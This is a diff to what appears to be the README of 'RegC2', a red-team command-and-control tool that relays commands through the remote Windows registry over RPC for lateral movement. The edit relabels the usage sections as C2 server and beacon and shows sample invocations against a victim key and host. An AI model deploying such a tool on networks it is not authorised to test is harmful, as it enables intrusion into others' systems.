@@ -30,12 +30,12 @@ Since the traffic is based on RPC, it should only be suitable for lateral moveme
 8. While running, the server will look for new updates to the "output" value and prints it back to the attacker.
 
 ### Usage:
-**Setup the server (listener):**
+**Setup the server (listener/C2):**
 ``` 
 RegC2Server.exe <Unique Registry key name to use>
 RegC2Server.exe victim01
 ```
-**Client-side:**
+**Client-side (beacon):**
 ```
 RegC2Client.exe <host> <Registry key name used to start the server>
 RegC2Client.exe ws01 victim01
